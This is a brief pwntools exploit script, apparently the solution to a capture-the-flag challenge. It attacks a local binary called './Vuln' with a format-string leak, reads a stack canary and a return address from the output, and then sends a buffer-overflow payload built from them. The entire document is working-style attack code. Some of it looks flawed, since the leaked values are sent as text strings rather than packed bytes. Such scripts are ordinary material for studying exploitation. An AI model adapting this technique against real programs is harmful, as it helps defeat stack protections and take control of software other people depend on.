from pwn import *

p = process("./Vuln")

print(p.recvuntil(":").decode())

p.sendline(b'%p.' * 12)

answer = p.recvuntil("?").decode()

address = answer.split('.')[6]

canary = answer.split('.')[2]

print(answer)

print("Address found: " + address)

print("Sending solve input...")

payload = b'A' * 20 + canary.encode() + b'A'*6 + address.encode()
p.sendline(payload)

print(p.recvall())